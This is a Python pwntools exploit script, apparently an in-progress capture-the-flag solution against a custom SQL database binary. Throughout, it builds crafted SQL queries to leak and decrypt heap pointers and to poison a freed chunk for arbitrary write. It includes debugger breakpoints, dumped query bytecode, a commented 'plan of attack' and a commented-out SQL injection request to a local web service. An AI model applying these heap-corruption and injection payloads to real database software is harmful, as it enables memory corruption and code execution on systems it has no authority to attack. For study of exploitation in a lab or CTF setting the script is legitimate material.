#!/usr/bin/env python3

from pwn import *
import os
from struct import pack, unpack
import requests as req

exe = ELF("db_patched")
libc = ELF("libc.so.6")
ld = ELF("ld.so.2")

context.binary = exe

web_host = "127.0.0.1"
web_port = "8080"

url_base = f"http://{web_host}:{web_port}/"

def conn():
    if args.LOCAL:
        r = process([exe.path, 'film.db'])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r

os.system("cp setup_complete.db film.db")
r = conn()

sa   = lambda a,b : r.sendafter(a,b)
sla  = lambda a,b : r.sendlineafter(a,b)
sd   = lambda a,b : r.send(a,b)
sl   = lambda a,b : r.sendline(a,b)
ru   = lambda a : r.recvuntil(a, drop=True)
rc   = lambda : r.recv(4096)
uu32 = lambda data : u32(data.ljust(4, b'\0'))
uu64 = lambda data : u64(data.ljust(8, b'\0'))

gdb_script = """
breakrva 0x5b68
breakrva 0x5429
breakrva 0x5bad
"""

#breakrva 0x7b72
#breakrva 0x727c
#breakrva 0x5118 malloc the build context
#breakrva 0x5266
#0x5429 place to break if I want to investigate the shellcode

def build_entry(cmd):
    payload = pack('H', len(cmd)+1)
    payload += cmd
    return payload

#    names = db.execute(
#        b"select name.nconst, name.name, category.name from principal\
#        join name on principal.nconst=name.nconst\
#        join category on id=category\
#        where tconst="+str(id).encode('latin1')+b";"
#    )
join = b"select title from title limit 50;"
create = f"create table {'A'*0x1a} (LOL integer"
for i in range(0xe):
    create += f",{chr(0x41+i)} blob"
create += ", primary key (LOL));"

create2 = "create table help2 (hid2 integer, help2 blob, pwninit integer, primary key (hid2));"
large_insert = f"insert into help values(3, '{'HELPMEME'*0xa}');"
select = "select help from help where help like '%help%';"
#0x7ffff2bbb8c0: 0x0000011700000000      0x0001021a000c0114
#0x7ffff2bbb8d0: 0x0004031001020316      0x00000602000a0312
#0x7ffff2bbb8e0: 0x0005061501020516      0x0000011900000601
#0x7ffff2bbb8f0: 0x0000000000010011      0x0000000000000000

#IOquery plan:
#  scan help
#    filter help like '%HELP%'
#
#initial regs:
#  r0  = {}
#  r1  = <cursor: 193784>
#  r4  = '%HELP%'

#  0: rst  r1
#  1: bend r1, c
#  2: ldr  r2, r1
#  3: proj r3, r2, 1
#  4: like r3, r4
#  5: bz   r3, a
#  6: mov  r6, r0
#  7: proj r5, r2, 1
#  8: app  r6, r5
#  9: yld  r6
#  a: next r1
#  b: b    1
#  c: ret


########################
#I?query plan:
#  search help using hid = 1
#
#initial regs:
#  r0  = {}
#  r1  = <cursor: 193784> #register data is pulled from
#  r4  = 1
#  r9  = 32
#
#bytecode:
#  0: mov  r3, r4
#  1: mov  r5, r0
#  2: app  r5, r3
#  3: find r1, r5
#  4: bend r1, b
#  5: ldr  r2, r1
#  6: mov  r8, r0
#  7: proj r7, r2, 1
#  this command get the help information
#  8: add  r7, r9
#  9: app  r8, r7
#  a: yld  r8
#  b: ret
#E$
#

#query plan:
#  scan help
#    filter help like '%LOL%'
#
#initial regs:
#  r0  = {}
#  r1  = <cursor: 193784>
#  r4  = '%LOL%'
#
#bytecode:
#  0: rst  r1
#  1: bend r1, e
#  2: ldr  r2, r1
#  3: proj r3, r2, 1
#  4: like r3, r4
#  5: bz   r3, c
#  6: mov  r6, r0
#  7: proj r5, r2, 1
#  8: proj r7, r2, 0
#  9: sub  r5, r7
#  a: app  r6, r5
#  b: yld  r6
#  c: next r1
#  d: b    1
#  e: ret
def decrypt_ptr(cipher):
    key = 0
    plain = ''

    cipher = cipher
    for i in range(6):
        bits = 64-12*i
        if bits < 0:
            bits = 0
        plain = ((cipher ^ key) >> bits) << bits;
        key = plain >> 12
    #print hex(key)
    #print hex(plain)
    #print hex(cipher)

    return plain, key


#this will change the offset that a pointer uses
fucky_cmd = "select title + 32 from title where tconst=9;"
#test_cmd = "select help - 1968 from help where hid=1;"

pwn_cmd = b"select tconst, title, year from title where title like '%Miss%' limit 2; select help + hid from help where help like '%HELP%';"

#insert = "insert into help2 values(1, 'LOL', 40);"
#insert = "insert into help2 values(3, 'LOL2', 32);"
insert_for_leak = "insert into help2 values(4, 'LOL2LOL2', 32);"
leak_heap = "select help2 - pwninit, help2 + pwninit from help2 where hid2=4;"

def send_cmd(cmd, do_encode=True):
    if do_encode:
        payload = build_entry(cmd.encode())
    else:
        payload = build_entry(cmd)
    print(payload)
    r.sendline(payload)


def do_leak():
    send_cmd(leak_heap)
    ru(b'D')
    r.recv(4)
    leak = u64(r.recv(8))
    log.info(hex(leak))
    plain, key = decrypt_ptr(leak)
    log.info(hex(plain))
    log.info(hex(key))
    return plain,key

def do_overwrite(poisoned_address):
    pwn_insert = b"insert into help2 values(5, '"+p64(poisoned_address)[:6] + b"', 32);"
    payload = build_entry(pwn_insert)
    print(payload)
    r.sendline(payload)
    overwrite_ptr = "select help2 + pwninit and help2, help2 - pwninit from help2 where hid2=5;"
    send_cmd(overwrite_ptr)

#plan of attack:
#    free something to do with apply
#    create a new fake chunk with ptr to a fake object in the original command
#    use that fake object to get arbitrary write
#    I can use the len feild of the db_dyn_record to underflow the values. this could let me pla ce as many columns as I like on the apply stack

def main():
    #res = req.get(url_base, params="term=Miss%'; select title + 20 from title where tconst=9;--")
    plain, key = do_leak()
    #log.info(res.content)
    #do_overwrite(0x414141414141 ^ key)
    #r.recv(12)
    #for i in range(6):
    #    r.sendline("A"*0x200)
    #r.sendline("A"*0x3b)
    insert_for_pwn = "insert into help2 values(5, 'LOL3LOL3', 3232);"
    insert_for_pwn2 = f"insert into help2 values(6, '{'A'*0x48}', 0);"
    send_cmd(insert_for_pwn)
    send_cmd(insert_for_pwn2)
    gdb.attach(r, gdbscript=gdb_script)
    cmd = b"select help2 - pwninit, help2 + pwninit, 'AAAAAAAAAA', 'BBBBBBBBBB' from help2 where hid2=5;--LOLOLOLOO"
    send_cmd(cmd, do_encode=False)
    #send_cmd("select help2 from help2;")

    r.interactive()


if __name__ == "__main__":
    main()
